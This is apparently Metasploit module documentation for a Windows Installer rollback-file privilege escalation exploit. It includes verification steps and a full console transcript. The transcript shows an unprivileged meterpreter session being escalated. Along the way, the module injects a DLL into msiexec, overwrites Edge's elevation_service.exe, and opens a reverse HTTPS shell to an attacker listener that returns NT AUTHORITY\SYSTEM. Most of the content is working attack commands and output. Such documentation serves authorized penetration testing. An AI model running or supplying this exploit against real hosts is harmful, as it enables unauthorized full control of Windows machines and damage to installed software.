## Vulnerable Application

On vulnerable versions of Windows, the Installer Service executes privileged file operations on 
the rollback file that is created in a standard user controlled directory. This behaviour can be 
triggered by failing installation the installation with a specific .msi file. The bug is abused
to redirect file creation into an arbitrary location in order to gain SYSTEM level privileges.
WARNING:
The elevation_service.exe (C:\Program Files (x86)\Microsoft\Edge\Application\*) on the target host
will be overwritten when the exploit runs.
This module has been tested against Windows 10 Pro x64.

## Options

## Verification Steps

1. Get a non-admin meterpreter session on Win10 RS5 x64
2. `use windows/local/installerfiletakeover`
3. `set session <session>`
4. `exploit`
5. Get a SYSTEM session

## Scenarios

### Windows 10 20H2 Build 10.0.19042 x64

```
msf6 exploit(windows/local/installerfiletakeover) > use windows/local/installerfiletakeover
[*] Using configured payload windows/x64/meterpreter/reverse_https
msf6 exploit(windows/local/installerfiletakeover) > set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
msf6 exploit(windows/local/installerfiletakeover) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/local/installerfiletakeover) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/installerfiletakeover) > show options

Module options (exploit/windows/local/installerfiletakeover):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.200.2.29      yes       The local listener hostname
   LPORT     8445             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Windows 10 x64


msf6 exploit(windows/local/installerfiletakeover) > exploit

[!] SESSION may not be compatible with this module (missing Meterpreter features: stdapi_sys_process_set_term_size)
[*] Started HTTPS reverse handler on https://10.200.2.29:8445
[*] Checking target...
[*] Target looks good... attempting the LPE exploit
[*] Launching C:\Windows\SysWOW64\msiexec.exe to host the DLL...
[+] Process 12692 launched.
[*] Reflectively injecting the DLL into 12692...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] https://10.200.2.29:8445 handling request from 10.200.2.11; (UUID: 7esul2h6) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 7 opened (10.200.2.29:8445 -> 127.0.0.1) at 2021-12-04 09:22:07 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```